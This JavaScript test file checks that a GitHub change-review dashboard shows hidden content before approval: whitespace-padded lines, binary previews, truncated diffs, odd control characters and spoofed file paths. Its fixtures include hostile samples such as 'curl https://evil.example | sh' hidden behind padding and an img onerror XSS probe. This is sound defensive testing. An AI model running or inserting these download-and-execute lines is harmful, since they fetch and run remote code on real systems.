// t_e02_gh_review_unseen.js — the GitHub review sheet never lets content be
// approved unseen (audit 2026-11-09 E02 UI half, E135 UI part, E61, E62, E63,
// E64, E08 UI half).
//
// The REAL dashboard/aux_github.js runs in the mini DOM (_a11y_dom.js) with
// index.html's real esc(); every /api/** answer is a local fixture. No
// dashboard, no network, no GitHub.
//
//   E02-1  a line padded far past the right edge: lines wrap, a wrapped row is
//          marked, a long run of blanks is drawn as ⟦N spaces⟧
//   E02-2  a file git calls binary: its text_preview is shown; without one the
//          headers never claim "nothing blocks" / "the whole change", and an
//          old server's info-only C-binary needs a UI tick (never sent)
//   E02-3  past line 3,000: Approve stays off until the rest is shown; the
//          control is at the top too; unknown warn/block check ids are generic
//   E135   gate() refuses a block check even when approvable says true
//   E61    a bare CR is marked, not drawn as a second row; a path holding " b/"
//          keeps its real name
//   E62    "pull request", not "draft pull request", when GitHub opened a ready one
//   E63    the toast stops taking clicks the moment our line is gone
//   E64    an edited description over the server's 8 KB blocks Approve
//   E08    write_reach other than "contained" warns and qualifies the headline
"use strict";
const fs = require("fs");
const path = require("path");
const { createWindow, harness, Event } = require("./_a11y_dom.js");
const T = harness();
const REPO = process.env.HERMES_REPO || path.resolve(__dirname, "..", "..", "..");
const SRC = fs.readFileSync(path.join(REPO, "dashboard", "aux_github.js"), "utf8");
const PY = fs.readFileSync(path.join(REPO, "dashboard", "aux_ghchanges.py"), "utf8");
const INDEX = fs.readFileSync(path.join(REPO, "dashboard", "index.html"), "utf8");
const ESC_SRC = (INDEX.match(/^function esc\(s\)\{.*\}$/m) || [""])[0];

const NOW = 1800000000;
const ID1 = "ghc-0123456789ab";
const HOSTILE = "<img src=x onerror=alert(1)>";
const BASE_HTML = "<!doctype html><html><head></head><body>" +
  '<main id="view-mind"><section id="sec-connections" class="set-panel"><div class="set-body"></div></section></main>' +
  '<div class="toast" id="toast" role="status" aria-live="polite"></div>' +
  "</body></html>";

async function scenario(name, fn) {
  try { await fn(); } catch (e) {
    T.check(name + " (ran without throwing)", false, String(e && e.stack || e).split("\n").slice(0, 4).join(" | "));
  }
}
async function page(o) {
  o = o || {};
  const w = createWindow({ html: BASE_HTML });
  w.__routes = Object.assign({ "/api/github/status": { ok: true, connected: false, repos: [], pending: 0 } }, o.routes || {});
  w.__defaultRoute = { __status: 404, body: { ok: false, error: "no route" } };
  w.__opened = [];
  w.open = function (u) { w.__opened.push(u); return null; };
  w.history.replaceState = function () { w.location.hash = ""; };
  w.console = { log: function () {}, warn: function () {}, error: function () {}, info: function () {}, debug: function () {} };
  w.__run(ESC_SRC, "esc.js");
  w.__toasts = [];
  // index.html's toast(): replaces the text, adds .on, removes it after ms
  w.__run("function toast(msg, ms){ var t = document.getElementById('toast'); __toasts.push([msg, ms]);" +
    " if (!t) return; t.textContent = msg; t.classList.add('on'); clearTimeout(t._t);" +
    " t._t = setTimeout(function(){ t.classList.remove('on'); }, ms || 2400); }", "toast.js");
  w.__run(SRC, "aux_github.js");
  await w.__tick(12);
  return w;
}
const G = function (w) { return w.hermesGitHub; };
function sheet(w) { return w.document.getElementById("gh-review"); }
function txt(el) { return el ? el.textContent : ""; }
function change_(el, v) { el.checked = !!v; el.dispatchEvent(new Event("change", { bubbles: true })); }
function input_(el, v) { el.value = v; el.dispatchEvent(new Event("input", { bubbles: true })); }
function heads(w) {
  return Array.from(sheet(w).querySelectorAll(".gh-h")).map(function (h) { return txt(h); });
}
function base(extra) {
  return Object.assign({
    id: ID1, repo: "octo-owner/site", private: true, branch: "hermes/typo-fix", slug: "typo-fix", mode: "new",
    state: "pending", title: "Fix a typo", body: "A small fix.", approvable: true, blocked: false, needs_ack: [],
    confirm_public: false, checks: [], stat: { files: 1, add: 1, del: 0 },
    files: [{ path: "a.py", status: "M", old_mode: "100644", new_mode: "100644", add: 1, del: 0, binary: false, size: 40 }],
    diff: "diff --git a/a.py b/a.py\nindex 1..2 100644\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n x = 1\n+y = 2\n",
    diff_truncated: false, digest: "d".repeat(64), default_branch: "main", base: { branch: "main", sha: "a".repeat(40), at: NOW },
    pr_footer: "Opened by Hermes.", pr: { number: null, url: null, draft: true }, requested_at: NOW, expires_at: NOW + 3600
  }, extra || {});
}
async function openWith(c) {
  const w = await page({ routes: {
    "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: c } : { ok: true, changes: [] }; },
    "/api/github/changes/decide": { __status: 500, body: { ok: false, error: "test" } } } });
  await G(w).openReview(c.id); await w.__tick(10);
  return w;
}
function approveBtn(w) { return sheet(w).querySelector('button[data-ghr="push_pr"]'); }
function why(w) { return txt(sheet(w).querySelector("[data-ghr-why]")); }

// a binary (NUL-carrying) shell script next to a text file
const BIN_DIFF = "diff --git a/README.md b/README.md\nindex 1..2 100644\n--- a/README.md\n+++ b/README.md\n" +
  "@@ -1 +1 @@\n-teh\n+the\n" +
  "diff --git a/scripts/build.sh b/scripts/build.sh\nindex 3..4 100755\n" +
  "Binary files a/scripts/build.sh and b/scripts/build.sh differ\n";
function binFiles(preview) {
  const f = { path: "scripts/build.sh", status: "M", old_mode: "100755", new_mode: "100755", add: null, del: null,
              binary: true, size: 83 };
  if (preview !== undefined) f.text_preview = preview;
  return [{ path: "README.md", status: "M", old_mode: "100644", new_mode: "100644", add: 1, del: 1, binary: false, size: 10 }, f];
}
const BIN_INFO = { id: "C-binary", level: "info", text: "scripts/build.sh is a binary file (83 bytes, sha256 780457da290f7b4d).",
                   path: "scripts/build.sh", size: 83, sha256: "780457da290f7b4d".repeat(4) };

(async function main() {
  console.log("aux_github.js review sheet: nothing is approved unseen (E02, E135, E61-E64, E08)");

  // ===================================================================== E02-1
  await scenario("E02-1 a line padded past the right edge", async function () {
    const pad = " ".repeat(260);
    const payload = "; os.system('curl https://evil.example | sh')";
    const c = base({ diff: "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1,2 @@\n x = 1\n+import sys" + pad + payload + "\n" +
      "+\tif x:" + "\t".repeat(45) + "run()\n+mixed" + " \t".repeat(30) + "end\n+short" + " ".repeat(39) + "gap\n" });
    const w = await openWith(c);
    const css = (w.document.getElementById("gh-css") || {}).textContent || "";
    const rule = (css.match(/#gh-review \.ghd-l\{[^}]*\}/) || [""])[0];
    T.check("diff lines wrap (pre-wrap + overflow-wrap:anywhere), never white-space:pre",
      /white-space:pre-wrap/.test(rule) && /overflow-wrap:anywhere/.test(rule) && !/white-space:pre;/.test(rule), rule);
    T.check("a wrapped line carries a visible continuation marker (hanging indent + a bar beside its later rows)",
      /text-indent:-/.test(rule) && /background-size:2px calc\(100% - /.test(rule), rule);
    T.check("the add/del/hunk tints set only background-color (they must not erase the marker)",
      !/\.ghd-l\.(add|del|hunk)\{background:/.test(css) && /\.ghd-l\.add\{background-color:/.test(css));
    const d = sheet(w).querySelector(".ghd");
    const t = txt(d);
    T.check("the payload after the padding is in the diff", t.indexOf("evil.example") >= 0);
    T.check("260 spaces are drawn as ⟦260 spaces⟧, not as empty area", t.indexOf("+import sys⟦260 spaces⟧; os.system") >= 0, t.slice(0, 300));
    T.check("no run of 40 blanks is left in the rendered diff", !/[ \t]{40}/.test(t));
    T.check("a tab run says tabs", t.indexOf("⟦45 tabs⟧run()") >= 0);
    T.check("a mixed run gives both counts", t.indexOf("mixed⟦30 spaces and 30 tabs⟧end") >= 0);
    T.check("a run under 40 is left as it is", t.indexOf("short" + " ".repeat(39) + "gap") >= 0);
    T.check("the run marker is styled as a marker", !!d.querySelector(".ghd-ws"));
    T.check("nothing blocks a plain change: Approve on", !approveBtn(w).disabled, why(w));
  });

  // ===================================================================== E02-2
  await scenario("E02-2 a binary file with no preview, old server (C-binary info)", async function () {
    const c = base({ files: binFiles(), checks: [BIN_INFO], diff: BIN_DIFF, stat: { files: 2, add: 1, del: 1 } });
    const w = await openWith(c);
    const h = heads(w).join(" | ");
    T.check("the Checks header does not say 'nothing blocks this change'", !/nothing blocks this change|nothing to report/.test(h), h);
    T.check("the Diff header does not say 'the whole change'", !/the whole change/.test(h), h);
    T.check("the headers say plainly that 1 file is not shown", (h.match(/1 file not shown/g) || []).length >= 2, h);
    const tick = sheet(w).querySelector('input[data-ack="ui:binary"]');
    T.check("the sheet asks for its own tick", !!tick &&
      /I am approving 1 file whose content is not shown here/.test(txt(tick.closest("li"))));
    T.check("...and names the file", /scripts\/build\.sh/.test(txt(tick.closest("li"))));
    T.check("Approve is off until it is ticked", approveBtn(w).disabled && /Tick every warning above to approve \(1 left\)/.test(why(w)), why(w));
    T.check("pure gate(): not ok without the tick", G(w).gate(c, { acks: {} }).ok === false);
    change_(tick, true);
    T.check("ticked: Approve on", !approveBtn(w).disabled, why(w));
    T.check("pure gate(): ok with the tick", G(w).gate(c, { acks: { "ui:binary": true } }).ok === true);
    const b = G(w).decideBody(c, G(w).state.review, "push_pr");
    T.check("the UI-only tick is never sent as a server ack", JSON.stringify(b.acks) === "[]" && JSON.stringify(b).indexOf("ui:") < 0, b);
    T.check("warnAcks() lists only what the server expects", JSON.stringify(G(w).warnAcks(c)) === "[]");
    // two files
    const c2 = base({ files: binFiles().concat([{ path: "img/x.gif", status: "A", binary: true, size: 9 }]), checks: [BIN_INFO], diff: BIN_DIFF +
      "diff --git a/img/x.gif b/img/x.gif\nnew file mode 100644\nindex 0..5\nBinary files /dev/null and b/img/x.gif differ\n" });
    const w2 = await openWith(c2);
    T.check("two unseen files: 'I am approving 2 files whose content is not shown here'",
      /I am approving 2 files whose content is not shown here/.test(txt(sheet(w2))) && /2 files not shown/.test(heads(w2).join(" ")));
    // a binary section in the diff with no file row still counts
    const c3 = base({ files: [], checks: [], diff: "diff --git a/q.bin b/q.bin\nBinary files a/q.bin and b/q.bin differ\n" });
    T.check("a binary section with no file row and no check: gate refuses without the tick",
      G(w).gate(c3, {}).ok === false && G(w).gate(c3, { acks: { "ui:binary": true } }).ok === true);
    // a git binary patch
    const c4 = base({ files: [], checks: [], diff: "diff --git a/q.bin b/q.bin\nGIT binary patch\nliteral 3\nKcmZ?\n" });
    T.check("a 'GIT binary patch' section counts too", G(w).gate(c4, {}).ok === false);
  });

  await scenario("E02-2 a binary file a new server covers with a warn check", async function () {
    const warn = Object.assign({}, BIN_INFO, { level: "warn", ack: "C-binary",
      text: "scripts/build.sh is a binary file whose content is not shown." });
    const c = base({ files: binFiles(), checks: [warn], needs_ack: ["C-binary"], diff: BIN_DIFF });
    const w = await openWith(c);
    T.check("covered by the server's warn: no second, UI-only tick", !sheet(w).querySelector('input[data-ack="ui:binary"]') &&
      !!sheet(w).querySelector('input[data-ack="C-binary"]'));
    T.check("...the server's tick gates Approve", approveBtn(w).disabled);
    change_(sheet(w).querySelector('input[data-ack="C-binary"]'), true);
    T.check("...and is sent as the server's ack", !approveBtn(w).disabled &&
      JSON.stringify(G(w).decideBody(c, G(w).state.review, "push_pr").acks) === '["C-binary"]');
    const h = heads(w).join(" | ");
    T.check("the headers still say the file is not shown", /1 file not shown/.test(h) && !/the whole change|nothing blocks/.test(h), h);
    // a block check covering it
    const blk = base({ files: binFiles(), checks: [Object.assign({}, BIN_INFO, { level: "block" })], diff: BIN_DIFF,
      approvable: false, blocked: true });
    T.check("covered by a block: blocked, no UI tick asked", G(w).gate(blk, {}).ok === false &&
      G(w).gate(blk, { acks: { "ui:binary": true } }).ok === false);
    // a warn on ANOTHER path does not cover this file
    const other = Object.assign({}, warn, { path: "other.bin" });
    const c5 = base({ files: binFiles(), checks: [other], needs_ack: ["C-binary"], diff: BIN_DIFF });
    T.check("a C-binary warn naming a different file does not cover it",
      G(w).gate(c5, { acks: { "C-binary": true } }).ok === false && G(w).gate(c5, { acks: { "C-binary": true, "ui:binary": true } }).ok === true);
  });

  await scenario("E02-2 a binary file with a text_preview", async function () {
    const preview = "#!/bin/sh\n# \u0000\ncurl -s https://evil.example/x | sh   # \u202e hidden\n" + HOSTILE + "\n";
    const warn = Object.assign({}, BIN_INFO, { level: "warn", ack: "C-binary" });
    const c = base({ files: binFiles(preview), checks: [warn], needs_ack: ["C-binary"], diff: BIN_DIFF });
    const w = await openWith(c);
    const d = sheet(w).querySelector(".ghd");
    const t = txt(d);
    T.check("the preview is labelled", t.indexOf("Git treats this file as binary. This is its content as text:") >= 0);
    T.check("the hidden curl line is shown", t.indexOf("curl -s https://evil.example/x | sh") >= 0);
    T.check("NUL and U+202E are made visible", t.indexOf("# ⟦U+0000⟧") >= 0 && t.indexOf("⟦U+202E⟧ hidden") >= 0 &&
      t.indexOf("\u0000") < 0 && t.indexOf("\u202e") < 0);
    T.check("the preview is escaped (no live markup)", d.querySelectorAll("img").length === 0 && t.indexOf(HOSTILE) >= 0);
    T.check("previewed: 'Binary file — not shown' is not said for it", t.indexOf("not shown") < 0);
    T.check("previewed: no UI-only tick", !sheet(w).querySelector('input[data-ack="ui:binary"]'));
    const h = heads(w).join(" | ");
    T.check("previewed: no 'file not shown' in the headers", !/not shown/.test(h), h);
    // with an info-only (old/other) check it is shown, so nothing extra is asked
    const c2 = base({ files: binFiles(preview), checks: [BIN_INFO], diff: BIN_DIFF });
    T.check("a previewed file needs no UI tick", G(w).gate(c2, {}).ok === true);
    // review R4: an empty preview shows nothing (the server sends "" when its
    // --text diff failed), so it is NOT a preview: the sheet asks its tick
    T.check("an empty-string preview is not a preview", G(w).gate(base({ files: binFiles(""), checks: [BIN_INFO], diff: BIN_DIFF }), {}).ok === false);
    T.check("a non-string preview is not", G(w).gate(base({ files: binFiles(42), checks: [BIN_INFO], diff: BIN_DIFF }), {}).ok === false);
  });

  // ===================================================================== E02-3
  await scenario("E02-3 past line 3,000", async function () {
    const lines = Array.from({ length: 3495 }, function (_, i) { return "+l" + i; });
    const c = base({ diff: "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -0,0 +1,3495 @@\n" + lines.join("\n") +
      "\ndiff --git a/c.py b/c.py\n--- a/c.py\n+++ b/c.py\n@@ -0,0 +1 @@\n+EVIL_AFTER_CUT\n",
      files: [{ path: "a.py", status: "A", add: 3495, del: 0 }, { path: "c.py", status: "A", add: 1, del: 0 }] });
    const w = await openWith(c);
    const s = sheet(w);
    T.check("Approve is off while lines are hidden", approveBtn(w).disabled && /Show the remaining 502 lines of the diff/.test(why(w)), why(w));
    T.check("pure gate(): not ok while hidden, ok once shown", G(w).gate(c, {}).ok === false && G(w).gate(c, { diffAll: true }).ok === true);
    const h = heads(w).join(" | ");
    T.check("the heading never says 'the whole change' while lines are hidden", !/the whole change/.test(h) &&
      /first 3,000 lines/.test(h) && /502 more not shown yet/.test(h), h);
    const btns = s.querySelectorAll('button[data-ghr="diff-all"]');
    T.check("the control is at the top of the diff as well as at the cut", btns.length === 2);
    const first = s.querySelector(".ghd").firstElementChild;
    T.check("...the first thing inside the diff box", !!first && !!first.querySelector('button[data-ghr="diff-all"]'));
    T.check("a file cut entirely keeps its header", Array.from(s.querySelectorAll(".ghd-fh")).some(function (x) { return /c\.py/.test(txt(x)); }));
    T.check("the payload after the cut is not yet in the sheet", txt(s).indexOf("EVIL_AFTER_CUT") < 0);
    w.__click(btns[0]); await w.__tick(4);
    T.check("shown: the payload is there", txt(sheet(w)).indexOf("EVIL_AFTER_CUT") >= 0);
    T.check("shown: Approve on", !approveBtn(w).disabled, why(w));
    T.check("shown: the heading may say 'the whole change'", /the whole change/.test(heads(w).join(" ")));
    // exactly at the cap: nothing hidden
    const at = base({ diff: Array.from({ length: 3000 }, function (_, i) { return "+l" + i; }).join("\n") + "\n" });
    T.check("exactly 3,000 lines: nothing hidden, Approve allowed", G(w).gate(at, {}).ok === true);
    const over = base({ diff: Array.from({ length: 3001 }, function (_, i) { return "+l" + i; }).join("\n") + "\n" });
    T.check("3,001 lines: one hidden, Approve refused", G(w).gate(over, {}).ok === false);
  });

  await scenario("E02-3 the 1 MB server cut needs its own tick", async function () {
    const c = base({ diff_truncated: true });
    const w = await openWith(c);
    const tick = sheet(w).querySelector('input[data-ack="ui:cut"]');
    T.check("a cut diff asks for a tick", !!tick && approveBtn(w).disabled);
    change_(tick, true);
    T.check("ticked: Approve on, nothing sent for it", !approveBtn(w).disabled &&
      JSON.stringify(G(w).decideBody(c, G(w).state.review, "push_pr").acks) === "[]");
    T.check("the heading says it is cut", /cut at 1 MB/.test(heads(w).join(" ")));
  });

  await scenario("E02-3 unknown check ids are handled by level", async function () {
    const w = await page();
    const longl = { id: "C-longline", level: "warn", ack: "C-longline", text: "a.py line 2 is 4,000 characters long." };
    const c = base({ checks: [longl], needs_ack: ["C-longline"] });
    T.check("an unknown warn id with an ack needs its tick", G(w).gate(c, {}).ok === false &&
      G(w).gate(c, { acks: { "C-longline": true } }).ok === true);
    T.check("...and that ack is sent", JSON.stringify(G(w).decideBody(c, { acks: { "C-longline": true } }, "push_pr").acks) === '["C-longline"]');
    const noack = { id: "C-mystery", level: "warn", text: "Something odd " + HOSTILE };
    const c2 = base({ checks: [noack] });
    T.check("a warn check with no ack is never ignored (a UI tick)", G(w).gate(c2, {}).ok === false &&
      G(w).gate(c2, { acks: { "ui:warn:0": true } }).ok === true);
    T.check("...and that UI tick is not sent", JSON.stringify(G(w).decideBody(c2, { acks: { "ui:warn:0": true } }, "push_pr").acks) === "[]");
    const h = G(w).checksHTML(c2, {});
    T.check("...it is rendered as a tickable row, escaped", /data-ack="ui:warn:0"/.test(h) && h.indexOf("<img") < 0);
    const unk = { id: "C-whatever", level: "block", text: "no" };
    T.check("an unknown block id blocks", G(w).gate(base({ checks: [unk] }), {}).ok === false);
  });

  // ===================================================================== E135
  await scenario("E135 gate() refuses a block check by itself", async function () {
    const w = await page();
    const c = base({ approvable: true, blocked: false, checks: [{ id: "C-secret-known", level: "block", text: "x" }] });
    const g = G(w).gate(c, { acks: {} });
    T.check("approvable:true + blocked:false + one block check -> not ok", g.ok === false && /A check blocks this change/.test(g.reason), g);
    T.check("approvable:false alone -> not ok", G(w).gate(base({ approvable: false }), {}).ok === false);
    T.check("blocked:true alone -> not ok", G(w).gate(base({ blocked: true }), {}).ok === false);
    T.check("approvable missing -> not ok", G(w).gate(base({ approvable: undefined }), {}).ok === false);
    T.check("the clean change -> ok", G(w).gate(base(), {}).ok === true);
  });

  // ===================================================================== E61
  await scenario("E61 a bare CR and a path holding ' b/'", async function () {
    const w = await page();
    const h = G(w).diffHTML("diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n x = 1\r-y = 2\n+ok\r\n");
    T.check("a bare CR is marked ⟦U+000D⟧", h.indexOf("x = 1<span class=\"gh-hid\">⟦U+000D⟧</span>-y = 2") >= 0, h);
    T.check("no raw CR reaches the page", h.indexOf("\r") < 0);
    T.check("a CRLF line's trailing CR is dropped silently", />\+ok<\/span>/.test(h), h);
    T.check("a lone line with only a CR", G(w).diffHTML("diff --git a/x b/x\n@@ -1 +1 @@\n+\r\r\n").indexOf("⟦U+000D⟧") >= 0);
    const d = "diff --git a/evil b/README.md b/evil b/README.md\n--- a/evil b/README.md\n+++ b/evil b/README.md\n@@ -1 +1 @@\n+x\n";
    const name = function (html) { return ((html.match(/<div class="ghd-fh">(.*?)<\/div>/) || [])[1] || ""); };
    T.check("the file name comes from the file list", name(G(w).diffHTML(d, { files: [{ path: "evil b/README.md" }] })) === "evil b/README.md",
      name(G(w).diffHTML(d, { files: [{ path: "evil b/README.md" }] })));
    T.check("...or from the +++ line when no list is given", name(G(w).diffHTML(d)) === "evil b/README.md", name(G(w).diffHTML(d)));
    const del = "diff --git a/old b/x.md b/old b/x.md\ndeleted file mode 100644\n--- a/old b/x.md\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\n";
    T.check("a deleted file is named from its --- line", name(G(w).diffHTML(del)) === "old b/x.md", name(G(w).diffHTML(del)));
    const ren = "diff --git a/p b/q b/r b/s\nsimilarity index 100%\nrename from p b/q\nrename to r b/s\n";
    T.check("a rename matched on the file list keeps the new name",
      name(G(w).diffHTML(ren, { files: [{ path: "r b/s", old_path: "p b/q" }] })) === "r b/s");
    const bin = "diff --git a/x b/y.bin b/x b/y.bin\nBinary files a/x b/y.bin and b/x b/y.bin differ\n";
    T.check("a binary section is named from the file list", name(G(w).diffHTML(bin, { files: [{ path: "x b/y.bin", binary: true }] })) === "x b/y.bin");
  });

  // ===================================================================== E62
  await scenario("E62 a ready pull request is not called a draft", async function () {
    let ch = base();
    const w = await page({ routes: {
      "/api/github/changes": function (url) { return url.indexOf("?id=") > 0 ? { ok: true, change: ch } : { ok: true, changes: [] }; },
      "/api/github/changes/decide": function () {
        ch = base({ state: "pr_open", pr: { number: 7, url: "https://github.com/octo-owner/site/pull/7", draft: false } });
        return { ok: true, state: "pr_open", notified: true, pr: { number: 7, url: "https://github.com/octo-owner/site/pull/7", draft: false } };
      } } });
    await G(w).openReview(ID1); await w.__tick(10);
    w.__click(approveBtn(w)); await w.__tick(14);
    const r = txt(sheet(w).querySelector("[data-ghr-result]"));
    T.check("says 'pull request #7', not 'draft'", /opened pull request #7/.test(r) && !/draft pull request/.test(r), r);
    T.check("...and that drafts were not available", /could not open a draft/.test(r), r);
    const w2 = await page();
    const html = G(w2).sheetHTML({ change: base({ state: "pr_open", pr: { number: 8, draft: true } }),
      result: { state: "pr_open", pr: { number: 8, draft: true } } });
    T.check("a draft is still called a draft", /opened draft pull request #8/.test(html));
  });

  // ===================================================================== E63
  await scenario("E63 the toast stops catching clicks once our line is gone", async function () {
    let pending = [];
    const st = function () { return { ok: true, connected: true, login: "o", repos: [], pending: pending.length, drift: [], attention: [],
      paused: { holds: [] }, push_budget: { limit: 10, used: 0 }, check: {}, ruleset: {} }; };
    const w = await page({ routes: { "/api/github/status": function () { return st(); },
      "/api/github/changes": function (url) {
        if (url.indexOf("?id=") > 0) return { ok: true, change: base() };
        return { ok: true, pending: pending.length, changes: pending.map(function (id) { return base({ id: id }); }) };
      } } });
    pending = [ID1];
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false); await w.__tick(8);
    const t = w.document.getElementById("toast");
    T.check("our line up: the toast takes a click", t.textContent === G(w).TOAST_MSG && t.style.pointerEvents === "auto");
    w.toast("The rule was copied.", 1000); await w.__tick(4);
    T.check("another line replaces it: no click at once", t.style.pointerEvents === "" && t.onclick === null && t.style.cursor === "",
      [t.style.pointerEvents, typeof t.onclick]);
    // our line again, then it simply fades
    pending = [ID1, "ghc-00000000ffff"];
    G(w).state.lastPollAt = Date.now() - 61000;
    await G(w).poll(false); await w.__tick(8);
    T.check("a second change: armed again", t.style.pointerEvents === "auto" && typeof t.onclick === "function");
    t.classList.remove("on"); await w.__tick(4);
    T.check("the line fades (no .on): no click", t.style.pointerEvents === "" && t.onclick === null);
  });

  // ===================================================================== E64
  await scenario("E64 an edited description over 8 KB", async function () {
    const m = PY.match(/^GHC_BODY_MAX = (.+)$/m);
    const j = SRC.match(/^\s*var BODY_MAX = (.+);$/m);
    T.check("the UI's BODY_MAX mirrors the server's GHC_BODY_MAX (drift guard)", !!m && !!j && m[1].trim() === j[1].trim() &&
      eval(j[1]) === 8192, [m && m[1], j && j[1]]);
    const c = base();
    const w = await openWith(c);
    const ta = sheet(w).querySelector("textarea[data-ghr-body]");
    input_(ta, "a".repeat(8200));
    T.check("over 8 KB: Approve off, and the sheet says why", approveBtn(w).disabled && /8 KB/.test(why(w)) && /too long/.test(why(w)), why(w));
    const cnt = sheet(w).querySelector("[data-ghr-count]");
    T.check("a byte counter shows it", !!cnt && /8,200/.test(txt(cnt)) && /8,192/.test(txt(cnt)), txt(cnt));
    input_(ta, "a".repeat(8000));
    T.check("under: Approve on", !approveBtn(w).disabled, why(w));
    input_(ta, "é".repeat(4100));
    T.check("bytes, not characters (4,100 x 2-byte é = 8,200 bytes)", approveBtn(w).disabled);
    input_(ta, "a".repeat(8180) + " @a @b @c @d");
    T.check("@mentions the server wraps count against the cap", approveBtn(w).disabled, why(w));
    input_(ta, c.body);
    T.check("back to the server's text: Approve on", !approveBtn(w).disabled);
    // an unedited long text is the server's final text: never blocked
    const long = base({ body: "b".repeat(8192) + " @x" });
    T.check("unedited text is never blocked (the server already fit it)", G(w).gate(long, { body: long.body }).ok === true);
  });

  // ===================================================================== E08
  await scenario("E08 write_reach on the Connections card", async function () {
    const HL = "Hermes keeps your GitHub key in a file only your account can read and never gives it to the agent. " +
      "That is why the key can only touch the repositories you picked, cannot change settings, and expires.";
    const mk = function (extra) {
      return Object.assign({ ok: true, connected: true, login: "octo", repos: [], enabled: [], pending: 0, drift: [], attention: [],
        paused: { by_owner_switch: false, holds: [] }, push_budget: { limit: 10, used: 0 }, check: {}, ruleset: {}, headline: HL }, extra);
    };
    const cardFor = async function (st) {
      const w = await page({ routes: { "/api/github/status": st, "/api/github/changes": { ok: true, changes: [] } } });
      await w.mindExtras(); await w.__tick(12);
      return w.document.getElementById("mind-extra-github");
    };
    let c = await cardFor(mk({ write_reach: "unchecked", write_reach_note: "GitHub gave no repository to test " + HOSTILE }));
    T.check("unchecked: the note is shown as a warning", /GitHub gave no repository to test/.test(txt(c)) &&
      !!c.querySelector("[data-gh-reach]") && c.querySelectorAll("img").length === 0);
    T.check("unchecked: the unqualified headline claim is gone", txt(c).indexOf("the key can only touch the repositories you picked") < 0, txt(c));
    c = await cardFor(mk({ write_reach: "all_repositories" }));
    T.check("no note: our own wording", /Hermes could not check whether this key reaches repositories you did not pick/.test(txt(c)) &&
      txt(c).indexOf("the key can only touch the repositories you picked") < 0);
    c = await cardFor(mk({ write_reach: "contained" }));
    T.check("contained: no warning, headline as sent", !c.querySelector("[data-gh-reach]") && txt(c).indexOf(HL) >= 0);
    c = await cardFor(mk({}));
    T.check("absent (older server): today's rendering", !c.querySelector("[data-gh-reach]") && txt(c).indexOf(HL) >= 0);
  });

  T.done();
})();
